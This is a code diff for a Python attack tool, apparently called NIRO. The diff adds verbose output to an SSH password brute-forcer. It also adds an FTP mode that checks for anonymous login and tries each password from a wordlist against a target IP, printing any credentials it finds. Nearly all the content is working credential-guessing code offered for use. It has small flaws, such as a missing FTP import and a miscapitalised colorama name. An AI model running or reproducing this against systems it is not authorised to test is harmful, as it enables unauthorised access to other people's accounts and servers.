@@ -2,6 +2,7 @@ import pyfiglet
 import socket,requests,datetime
 import os,sys
 import paramiko
+from colorama import Fore, back, Style
 
 
 intro1 = pyfiglet.figlet_format("--->\\NIRO/<---")
@@ -130,10 +131,11 @@ if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then cont
 
                 try :
                     res = ssh_connect(password)
+                    print('Trying : '+username+'/'+password)
                     if (res==0) :
                         print("[OK] Password found: "+ password)
                         print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
-                        print("username : " +username)
+                        print("username : "+ username)
                         print("Password : "+ password)
                         print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                         exit(0)
@@ -146,3 +148,61 @@ else:
         print("(-_-) PORT 22 CLOSED...")
 
 print("---------------END OF SSH BruteForce-----------------")
+
+print("[*-*] Starting NIRO in FTP Brute force mode ...")
+
+ftp = pyfiglet.figlet_format("FTP BruteForce")
+print(ftp)
+
+
+def anonymous(ip):
+    try :
+        ftp= FTP(ip)
+        ftp.login()
+        print("-----------------------------")
+        print("[+] Anonymous Login is OPEN")
+        print("------------------------------")
+        ftp.quit()
+    except:
+      pass    
+
+def ftp_login(ip,username,password):
+    try:
+        ftp = FTP(ip)
+        ftp.login(username, password)
+        ftp.quit()
+        print("[!] Credentials have found.")
+        print("[!] Username : " + username)
+        print("[!] Password : "+ password)
+        exit(0)
+    except:
+        pass
+
+
+def brute_force(ip, username, wordlist):
+    try:
+        ftp_list = open(wordlist, 'r')
+        words = ftp_list.readlines()
+        for word in words:
+            word = word.strip()
+            print('Trying : '+username+'/'+word)
+            ftp_login(ip, username, word)
+
+    except:
+        print("[-] There is no such wordlist file.")
+        exit(0)
+
+#Main program
+if probe_port(sys.argv[1],21) == 0:  #verification est ce que le port 21 est ouvert
+   print("----------------------------")
+   print(" [+] 21/TCP  FTP ---> OPEN ")
+   print("----------------------------")
+   username_ftp = input("Enter a spesific useranme : ")
+   wordlists = input("Enter FTP list file location : ") 
+   brute_force(sys.argv[1],str(username_ftp),str(wordlists))
+   anonymous(sys.argv[1])
+else :
+    print("----------------------------")
+    print("[!] 21/TCP FTP ---> CLOSED")
+    print("----------------------------")
+print("---------------END OF FTP BruteForce-----------------")
